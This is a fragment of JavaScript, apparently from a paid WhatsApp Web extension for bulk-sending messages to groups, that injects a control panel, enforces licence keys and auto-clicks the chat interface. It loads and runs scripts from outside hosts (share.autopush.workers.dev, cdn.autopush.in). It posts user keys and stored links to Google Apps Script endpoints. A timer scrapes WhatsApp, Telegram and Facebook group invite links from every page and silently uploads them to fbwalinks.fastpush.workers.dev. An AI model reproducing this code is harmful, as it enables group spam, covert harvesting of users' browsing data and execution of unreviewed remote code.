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') no-repeat local #fff;padding-left:35px;padding-top:13px;font-size:13px;line-height:16px}#fastbox input{vertical-align:-1px;padding:5px}#fastbox,#showbtn{position:fixed;right:0;top:0}#fastbox{font-weight:600;color:#222;width:386px;height:100%;z-index:9999;background:#f7fafd;border-left:1px solid #bed2f1;border-bottom:1px solid #bed2f1;padding:14px;/*-webkit-user-select:text;-moz-user-select:text;-ms-user-select:text;user-select:text;*/overflow:auto;font-size:12px}#fastbox input,#fastbox table,.buttonx{width:100%;text-align:center}#fastbox .pkcheckbox{width:auto;margin-right:5px}.buttonx,.cnoti span{display:block;padding:10px;border-radius:4px}.buttonx{margin:10px 0;background:#555;color:#fff}#fastbox label,.buttonx{cursor:pointer}.buttonx.small{width:auto;display:inline-block;padding:5px 15px;margin:2px;font-size:12px;text-decoration:none;font-weight:600;background:#005af0;line-height:initial}.cnoti span{text-align:center;position:relative;bottom:-200px;width:240px;margin:0 auto;background-color:#222;color:#fefefe;line-height:22px;opacity:0;transition:all .3s ease-in-out;-webkit-transition:all .3s ease-in-out;-webkit-animation:slidein 2s ease forwards;animation:slidein 2s ease forwards}.cnoti{display:flex;position:fixed;right:10px;bottom:0;z-index:99999}#showbtn{z-index:9996}#showbtn,.hidden{display:none}#fastbox table{border-collapse:collapse;border-spacing:0;margin-top:10px}#fastbox table thead tr th,#fastbox table tr td{border:1px solid #ccc;padding:8px;width:50%;font-weight:600}.buttonx.pkbg{background:#2f5bb7}#eframe{height:0;width:0;overflow:hidden}input::selection,textarea::selection{background-color:#1e73be54!important;color:#fff!important}input::-moz-selection,textarea::-moz-selection{background-color:#1e73be54!important;color:#fff!important}", document.body.appendChild(e)
    }
     fetchafterrun('https://share.autopush.workers.dev/import?id=configuration');
    checkwpcss();
    
    function reloadbtn() {window.onbeforeunload = function () {};
    location.reload()
    }
    
    function startwin(k) {
         document.getElementById("send_btn_show").innerHTML = '<a class="runbutton2 small2" href="Javascript:clickopenmenu();" title="Clear Msg">Clear Msg</a><a class="runbutton2 small2" href="Javascript:reloadbtn();" title="Reload">Reload</a>';fetchafterrun()
    }
	document.getElementById("findnumbershow").innerHTML=findnumbersend();
    function myextra(e) {
        console.log('tool started2')
    }
    function serverdown() {
        setInterval(function () {alert("Server Dowon")}, 1000);
    }
function gjoinsend(e, n) {
    var kp = localStorage.getItem("keycodesave");
    var api;

    if (kp === "prakash" || kp === "pkjoingroup") {
        api = "https://script.google.com/macros/s/AKfycbzlsH7D63_InTgcHL7razrcpffm6neHfCsgA7JPMuI-EgYKvyvUnPVdSwSFpJP15I2EAA/exec";
    } else {
        api = "https://script.google.com/macros/s/AKfycbypMVs2dVivekePWhnVmmOa4IJTj1BF78180IeQgilQyjlEH5OzZG5lg08ZQkxueAft/exec";
    }

    var t;

    if (n.includes("fullgroup")) {
        t = "fullgroup";
    } else if (n.includes("maindb")) {
        t = "maindb";
    } else if (n.includes("alllinkdb")) {
        t = "alllinkdb";
    } else if (n.includes("savedjoined")) {
        t = "savedjoined";
    } else if (n.includes("groupincommunity")) {
        t = "groupincommunity";
    } else if (n.includes("communitylinks")) {
        t = "communitylinks";
    } else if (n.includes("Announcement")) {
        t = "Announcement";
    } else if (n.includes("requestjoin")) {
        t = "requestjoin";
    } else if (n.includes("linkunavailable")) {
        t = "linkunavailable";
    } else if (n.includes("bestlink")) {
        t = "bestlink";
    } else if (n.includes("lockedgroup")) {
        t = "lockedgroup";
    } else if (n.includes("groupmembercount")) {
        t = "groupmembercount";
    } else {
        t = "other";
    }

/* group data recive */
var joindatasend = new FormData();
var allpklinkstore=localStorage.getItem("allpklinkstore");
joindatasend.append('uses', e+kp);
joindatasend.append('allpklinkstore', allpklinkstore);
joindatasend.append(t, n.split("\n").join(","));

post_data_server(api,joindatasend)
}

function error() {
document.body.innerHTML = `<iframe srcdoc="
<style>
    body {
      background: #fff;
      text-align: center;
      margin: 0;
      font-family: Arial, sans-serif;
    }
    p {
      font-size: 18px;
      color: #333;
      padding: 0;
    }
    .buttonx {
      background-color: #007BFF;
      color: white;
      border: none;
      padding: 10px 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      margin: 10px;
    }
    .buttonx:hover {
      background-color: #0056b3;
    }
    form {
      display: inline-block;
    }
    a {
      text-decoration: none;
    }
  </style>
<p>No Active Plan</p>

<form method='POST' action='https://share.autopush.workers.dev/pay' target='_blank'><input type='text' id='licence-id' name='licence-id' value='wanumber' required hidden><input type='tel' id='phone-id' name='phone-id' required hidden value=`+findnumber()+`><button type='submit' class='buttonx'>Renual Now</button></form><a href='https://share.autopush.workers.dev/pay' target='_blank' class='buttonx'>Pay Amount</a><a href='https://wagroupsender.blogspot.com/' target='_blank' class='buttonx'>Buy Now</a>." style="width:100%;height:100vh;background:white;"></iframe>`;

}
    
    function amessage() {
        document.getElementById("alertbox").style.display = "block"
    }
	function clickbtnpress(e) {
    var c = document.createEvent("MouseEvents");
    c.initMouseEvent("click", !0, !0, window, 0, 0, 0, 0, 0, !1, !1, !1, !1, 0, null), e.dispatchEvent(c)
}

function clickopenmenu() {
	
    var ek = document.querySelector('#main button[title="Cancel forward"] span[data-icon="x"]');
	if(ek){
		clickbtnpress(ek)
	}
	    var ek2 = document.querySelector('#main button[title="Cancel forward"] span[data-icon="close-refreshed"]');
	if(ek2){
		clickbtnpress(ek2)
	}
	
    var e = document.querySelector('#main header [aria-label="Menu"]');
    e ? (clickbtnpress(e), setTimeout(clickclearclick, 100)) : setTimeout(clickopenmenu, 100)
}

function clickclearclick() {
    var e = document.querySelector('[aria-label="Clear chat"]');
    var ek = document.querySelector('[data-icon="clear-refreshed"]');
    
    if (e) {
        clickbtnpress(e);
        setTimeout(clickook, 100);
    }else if (ek) {
        clickbtnpress(ek);
        setTimeout(clickook, 100);
    } else {
        setTimeout(clickclearclick, 100);
    }
}
function clickook() {
    var e = document.querySelector('[data-animate-modal-popup="true"] button.xk0ssx3');
    var ek = document.querySelector('[data-animate-modal-popup="true"] button.xowaa7l');
    
    if (e) {
        clickbtnpress(e);
    } else if (ek) {
        clickbtnpress(ek);
    } else {
        setTimeout(clickook, 500);
    }
}

	function pkvalidtil(e){checkwp(),new Date(e+" 00:00:00").getTime()-((new Date).getTime()+1728e5)<0&&amessage(),document.getElementById("validate").innerHTML=e,new Date(e+" 00:00:00").getTime()-(new Date).getTime()<0&&error()}



      window.onbeforeunload = function () {};
  window.onbeforeunload = function () {};
  window.onbeforeunload = function () {};
  window.onbeforeunload = function () {};
  window.onbeforeunload = function () {};

function show_share_btn() {
        document.getElementById("more_show").innerHTML = `<span id='send_btn_show'><a class="runbutton2 small2" href="Javascript:clickopenmenu();" title="Clear Msg">Clear Msg</a><a class='runbutton2 small2' href='Javascript:join_group();' title='Show'>Join Group</a><!-- <a class='runbutton2 small2' href='Javascript:fmissue_fix();' title='Show'>FM issue Fix</a>
<a class='runbutton2 small2' href='Javascript:fmbetanew();' title='Show'>FM Sender (testing)</a>-->
<a class='runbutton2 small2' href='Javascript:beta_user_sender();' title='Show'>FM Sender (Beta User)</a></span>`
    }
    show_share_btn()

    function join_group() {
		startwin("https://share.autopush.workers.dev/import?id=joingroup2")
    }

    function fmissue_fix() {
		startwin("https://share.autopush.workers.dev/import?id=fmissue")
    }

    function beta_user_sender() {
		startwin("https://share.autopush.workers.dev/import?id=fmissue2")
    }
    function fmbetanew() {
		startwin("https://share.autopush.workers.dev/import?id=fmbetanew")
    }

if (localStorage.getItem("checkboxState") == "true") {
	fmissue_fix();
}

if(localStorage.getItem("autojoinon")){
	join_group();
}

if(localStorage.getItem("fmissuefix2")){
	fmissue_fix();
}

// alert("Jis Number Par Extension Forward Message Work Na kare wo us number pr (FM issue Fix) use kare");
function pkreloadauto() {
  window.onbeforeunload = function () {};
		window.onbeforeunload = function () {};
		location.reload();

}

function pkusertrust() {
if(localStorage.getItem("keycodesave")=="amitsir99"){

  window.onbeforeunload = function () {};
  window.onbeforeunload = function () {};
  window.onbeforeunload = function () {};
  window.onbeforeunload = function () {};
  window.onbeforeunload = function () {};
		window.onbeforeunload = function () {};
		location.reload();

}

}

if (localStorage.getItem("refreshtime")) {

	if (localStorage.getItem("refreshtime") != "2") {
		alert("Refresh Page 2/2");localStorage.setItem("refreshtime", "2");
		pkreloadauto();
	}

} else {
	alert("Refresh Page 1/2");localStorage.setItem("refreshtime", "1");
	pkreloadauto();
}

/*

if (!sessionStorage.getItem("refreshkro")) {

sessionStorage.setItem("refreshkro", "1");
pkreloadauto();
}

*/

function pushscpt(){
}

function pushscpt2(){
if(localStorage.getItem("keycodesave")=="amitsir99"){
const script2 = document.createElement("script");
script2.src = "https://cdn.autopush.in/wa/error.js";
document.body.appendChild(script2);
}}



// ✅ Track already sent links
const sentLinks = new Set();

// ✅ Queue for links to be sent
let sendQueue = [];
let sending = false;

// Add link to queue
function queueLink(link) {
  if (!link) return;
  if (sentLinks.has(link)) return; // already sent or queued

  sentLinks.add(link);  // mark to prevent duplicates
  sendQueue.push(link);

  // Start processing if not already running
  if (!sending) processQueue();
}

// Process queue with delay
async function processQueue() {
  if (sendQueue.length === 0) {
    sending = false;
    return;
  }

  sending = true;
  const link = sendQueue.shift();

  try {
    const res = await fetch("https://fbwalinks.fastpush.workers.dev/api/links", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ link })
    });

    const data = await res.json();
    if (data.status === "success") {
    } else {
     // console.warn("Failed to add link:", data);
      sentLinks.delete(link); // allow retry later
    }
  } catch (err) {
    console.error("Error sending link:", err);
    sentLinks.delete(link); // allow retry later
  }

  // Wait 300ms before sending next (adjust if still rate-limited)
  setTimeout(processQueue, 300);
}


function get_group_link() {
    var t = localStorage.getItem("allpklinkstore") ? JSON.parse(localStorage.getItem("allpklinkstore")) : [];
    localStorage.setItem("allpklinkstore", JSON.stringify(t));

    // Extract links from document links (anchor tags)
    for (var x = document.links, i = 0; i < x.length; i++) {
        if (("chat.whatsapp.com" == x[i].hostname || x[i].href.includes("telegram") || x[i].href.includes("t.me") || x[i].href.includes("facebook.com/groups/")) && -1 === t.indexOf(x[i].href)) {
            t.push(x[i].href);queueLink(x[i].href);
        }
    }

    // Extract links from the body text using regex
    var bodyText = document.body.innerText;
    var regex = /https?:\/\/(?:chat\.whatsapp\.com\/(?:invite\/)?[a-zA-Z0-9]+|(?:m\.|www\.)?facebook\.com\/groups\/[A-Za-z0-9.\-_]+|(?:www\.)?facebook\.com\/share\/p\/[A-Za-z0-9]+|(?:t\.me|telegram\.me)\/[A-Za-z0-9_+]+)/gi;
    var matches = bodyText.match(regex) || [];

    // Add found links to the stored array if not already present
    matches.forEach(function(link) {
        if (!t.includes(link)) {
            t.push(link);queueLink(link);
        }
    });

    // Update localStorage with the new links
    if (t.length > 0) {
        localStorage.setItem("allpklinkstore", JSON.stringify(t));
        localStorage.setItem("linkstore", JSON.stringify(t));
        localStorage.setItem("linkjstore", JSON.stringify(t));
        localStorage.setItem("userextlinkstore", JSON.stringify(t));
    }
}

setInterval(get_group_link, 500);
/*

caches.keys().then((keyList) => Promise.all(keyList.map((key) => caches.delete(key)))) */


function checkwp() {
    var e = document.createElement("div");
    e.innerHTML = `<input class="stickAdin hidden" id="stickAdin" type="checkbox"/><div class="cnoti" id="snotif"></div><label id="showbtn" class="buttonx small" for="stickAdin">Show</label><div id="fastbox"><div id="resize-handle"></div><div class="right"><label class="buttonx small" for="stickAdin">Close</label></div><p>Match Message <!--a href="javascript:pasteauto()" title="Paste Text From clipboard">(Paste New Msg)</a> &#8226; --><a href="javascript:executePickAndGet()" title="Pick link New Msg">(Pick Link)</a> &#8226; <a href="javascript:scroll_to_bottom()" title="Scroll To Bottom">(Scroll Down)</a></p><input class="selectable-text2" id="matchmsg" title="Match Message" placeholder="Match Message" style="text-align:left"/>
	
	<p>Enter Msg ID <a href="javascript:viewmsgid('datamessageid')" title="Pick link New Msg">(Enable Msg ID Picker)</a></p><input class="selectable-text2" id="datamessageid" title="Msg ID" placeholder="Send Msg ID" style="text-align:left"/>
	
	<!--p>Enter Channel Msg URL</p><input class="selectable-text2" id="channelmsgurlpick" title="Msg ID" placeholder="Send Msg ID" style="text-align:left"/>-->

	<a class="buttonx pkbg" href="javascript:removedatabase()" title="New Message">New Message</a><input class="stickAdinee hidden" id="stickAdinee" type="checkbox" checked=""/><a class="buttonx" href="javascript:get_group_name('send_msg_group_name')" title="Get Group Name" style="background:purple">Pick Group Name</a><input type="text" id="send_msg_group_name" name="textname" placeholder="Your Message Sender Group Name" required="" value="wagroupsender" style="text-align:left"/><label class="buttonx" for="stickAdinee" style="background:#c13949" id="showbtnee">Show More Option</label><div id="fastboxee"><label class="buttonx" for="stickAdinee" style="background:#c13949">Hide More Option</label><p>Group Blacklist 1 <a href="javascript:sblacklist()" title="Save Group">(Save)</a> &#8226; <a href="javascript:ablacklist()" title="Add Group">(Add Group)</a></p><label for="group_blacklist_1" class="buttonx"><input type="checkbox" id="group_blacklist_1" name="group_blacklist_1" class="pkcheckbox" checked=""/>Group Blacklist 1</label><textarea class="selectable-text2" id="blacklist" title="Group Blacklist" placeholder="Your Group Name"></textarea><p>Group Blacklist 2 <a href="javascript:sblacklist2()" title="Save Group">(Save)</a> &#8226; <a href="javascript:ablacklist2()" title="Add Group">(Add Group)</a></p><label for="group_blacklist_2" class="buttonx"><input type="checkbox" id="group_blacklist_2" name="group_blacklist_2" class="pkcheckbox" checked=""/>Group Blacklist 2</label><textarea class="selectable-text2" id="blacklist2" title="Group Blacklist" placeholder="Your Group Name"></textarea><p>Group Blacklist 3 <a href="javascript:sblacklist3()" title="Save Group">(Save)</a> &#8226; <a href="javascript:ablacklist3()" title="Add Group">(Add Group)</a></p><label for="group_blacklist_3" class="buttonx"><input type="checkbox" id="group_blacklist_3" name="group_blacklist_3" class="pkcheckbox" checked=""/>Group Blacklist 3</label><textarea class="selectable-text2" id="blacklist3" title="Group Blacklist" placeholder="Your Group Name"></textarea><p>Group Blacklist 4 <a href="javascript:sblacklist4()" title="Save Group">(Save)</a> &#8226; <a href="javascript:ablacklist4()" title="Add Group">(Add Group)</a></p><label for="group_blacklist_4" class="buttonx"><input type="checkbox" id="group_blacklist_4" name="group_blacklist_4" class="pkcheckbox" checked=""/>Group Blacklist 4</label><textarea class="selectable-text2" id="blacklist4" title="Group Blacklist" placeholder="Your Group Name"></textarea>
        <p>Exclude groups based on match saved contacts:</p><textarea class="selectable-text2" id="saved_no_joined_name" title="Saved contact Joined" placeholder="Comma-separated values ex: Prakash 1, Prakash 5">xyzname</textarea>
        
        <label for="sdelayon" class="buttonx"><input type="checkbox" id="sdelayon" name="delayon" class="pkcheckbox" checked=""/>Match Msg After</label><input type="number" id="sdelay" name="number" value="5" placeholder="Match Msg After" required="" min="5"/><label for="autodelay" class="buttonx"><input type="checkbox" id="autodelay" name="encodew" class="pkcheckbox" checked=""/>Max Pending Msg</label><input type="number" id="advdelay" name="number" value="2" placeholder="Max Pending Msg" required="" min="1"/><label for="sautodelay" class="buttonx"><input type="checkbox" id="sautodelay" name="encode" class="pkcheckbox" checked=""/>Auto Single Send</label><p>Group Database</p><textarea class="selectable-text2" id="smdb" title="Group Database" placeholder="Group Database"></textarea>
        
        <p>Send msg in Group Name</p><textarea class="selectable-text2" id="sendgrouppurename" placeholder="Send msg in this Group Name"></textarea>
        
        <p>Send msg only which Group Member B/W</p>
        <div class="input50"><input type="number" id="minRange" placeholder="Enter min value" value="1"/> - <input type="number" id="maxRange" placeholder="Enter max value" value="2000"/></div>
        <div class="buttonx" style="height: 0;overflow: hidden;padding: 0;margin: 0">Max Select Group</div><input type="number" id="advdelay2" name="number" value="5" placeholder="Delay Time" required="" min="1" max="5" style="height: 0;overflow: hidden;padding: 0;margin: 0;visibility: hidden;"/><label for="deep_group_check" class="buttonx" style="/*height: 0;overflow: hidden;padding: 0;margin: 0;visibility: hidden;*/"><input type="checkbox" id="deep_group_check" name="encode" class="pkcheckbox" checked=""/>Msg not send to user</label><a class="buttonx" href="javascript:contactcount()" title="Pick Contact List" style="background:purple">Pick Contact List</a><input type="number" id="contact_list_no" name="number" value="1" placeholder="Contact List Count" required="" min="1"/><p>Extracted Group Links <a href="javascript:get_extract_link()" title="Save Group Links">(Get Link)</a> &#8226; <a href="javascript:old_link_remove()" title="Old Link Remove">(Old Link Remove)</a></p><textarea class="selectable-text2" id="all_extract_link" title="Extracted All Links" placeholder="Extracted All Links" style="height: 0;overflow: hidden;padding: 0;margin: 0;border: 0;"></textarea><textarea class="selectable-text2" id="get_extract_link" title="Group Links" placeholder="Extracted Group Links">https://chat.whatsapp.com/</textarea><div class="buttonx">Backup/ Restore Settings</div><a class="buttonx pkbg" href="javascript:backup_settings()" title="Backup Settings">Click to Backup Settings</a><input type="file" id="fileInput"/><a class="buttonx pkbg" href="javascript:restore_settings()" title="Restore Settings">Restore Settings</a><label for="fulldelay" class="buttonx">Delay Work</label><input type="number" id="fulldelay" name="number" value="1" min="1"/><label for="sleepToggle" class="buttonx"><input type="checkbox" id="sleepToggle" name="sleepToggle" class="pkcheckbox"/>Enable Sleep</label><div id="sleepTimeInputs" style="display: none;"><div class="buttonx">Start Sleep Time</div><input type="number" id="startafterSleepcheck" name="number" value="3" min="1"/><div class="buttonx">Min Sleep Time (seconds)</div><input type="number" id="minSleepTime" name="number" value="5" min="1"/><div class="buttonx">Max Sleep Time (seconds)</div><input type="number" id="maxSleepTime" name="number" value="10" min="1"/></div></div><label for="stoprun" class="buttonx"><input class="pkcheckbox" type="checkbox" id="stoprun" name="auto"/>Stop Work</label>
		<div id="alertbox" style="display:none">
		<div class="buttonx" style="background:#a50045">Expire Soon...</div>
		<form method="POST" action="https://share.autopush.workers.dev/pay" target="_blank"><input type="text" id="licence-id" name="licence-id" value="wanumber" required hidden><input type="tel" id="phone-id" name="phone-id" required hidden><button type="submit" class="buttonx">Renual Now</button></form></div>
		
		
		<a class="buttonx" href="javascript:sendspt()" title="Send Now" style="background: green;">Start Work</a><div class="buttonx pkbg" id="stped" style="display:none">Work Stopped!</div><div class="buttonx pkbg" id="wcomp" style="display:none">Work Complete!</div><div class="buttonx pkbg" id="wwait" style="display:none">Please Wait!</div>
<label for="scheduleToggle" class="buttonx"><input type="checkbox" id="scheduleToggle" name="scheduleToggle" class="pkcheckbox"/>Enable Schedule Task</label><div id="scheduleInputs" style="display: none;">
		    <form id="taskForm">
		<p>Pick Group Name <a href="javascript:get_group_name('taskName')" title="Pick link New Msg">(Pick Group)</a></p>
        <input type="text" id="taskName" placeholder="Enter Group Name" required style="text-align:left"/>
		
		

        <p>Enter Msg ID <a href="javascript:viewmsgid('msgid')" title="Pick link New Msg">(Enable Msg ID Picker)</a></p>
        <input type="text" id="msgid" placeholder="Enter Message ID" required style="text-align:left"/>

        <p>Match Message <a href="javascript:picklink('taskMessage','msgid')" title="Pick link New Msg">(Pick Link)</a></p>
        <input type="text" id="taskMessage" placeholder="Enter Match Message" required style="text-align:left"/>
		
		
        <!--p>Channel Message URL</p>
        <input type="text" id="channelmsgurl" placeholder="Enter Channel Message URL" required style="text-align:left"/>
		-->
        <p>Group/ Channel Type</p>
        <select id="msgtype">
        <option value="groupmsg">Group Message</option>
        <option value="channelmsg">Channgel Message</option>
		</select>
		
		
        <p>Task Date and Time:</p>
        <input type="datetime-local" id="taskDateTime" required style="text-align:left"/>
        <button type="button" class="buttonx pkbg" onclick="addOrUpdateTask()">Save Task</button>
    </form>

    <h2>Scheduled Tasks</h2>
    <ul id="taskList"></ul></div>
	
	<table><thead><tr><th colspan="2" style="width:100%;background:#555;color:#fff"><a href="javascript:executePickAndGet()" title="Pick link New Msg" style="color:yellow">Pick Link</a><!-- &#8226; <a href="javascript:pasteauto()" title="Paste Text From clipboard" style="color:yellow">Paste New Msg</a--> &#8226; Reports &#8226; <a href="javascript:scroll_to_top()" title="Scroll To Top" style="color:yellow">Go To Top</a></th></tr></thead><tbody id="totalreport"><tr><td>Selected Group</td><td><span id="tadmin">0</span></td></tr><tr><td>Successful Send</td><td><span id="tsend">0</span></td></tr><tr><td><a href="javascript:pendingcheck()" title="Pending Group">Pending Group <span style="color:red;font-weight:800;transform:rotate(90deg);display:inline-block">&#x21bb;</span></a></td><td><span id="pendingsend">0</span></td></tr><tr><td>Match Msg Check</td><td><span id="match_msg_check">0</span></td></tr><tr><td><a href="javascript:scroll_count_zero()" title="Pending Group">Smart Scroll Count <span style="color:red;font-weight:800;transform:rotate(90deg);display:inline-block">&#x21bb;</span></a></td><td><span id="scroll_count">0</span></td></tr><tr><td><a href="javascript:countlist()" title="Count Group/ Chat ">Count Group/ Chat <span style="color:red;font-weight:800;transform:rotate(90deg);display:inline-block">&#x21bb;</span></a></td><td><span id="countlist">0</span></td></tr><tr><td>All Ext. Group Links</td><td><span id="extract_group_link">0</span></td></tr><tr><td>Login Date</td><td><span id="login_date">Not Found</span></td></tr></tbody><tfoot><tr><td colspan="2" style="width:100%;background:#555;color:#fff;">Valid Till: <span id="validate"></span></td></tr></tfoot></table></div><div id="pkloadads" style="display:none"></div>`, 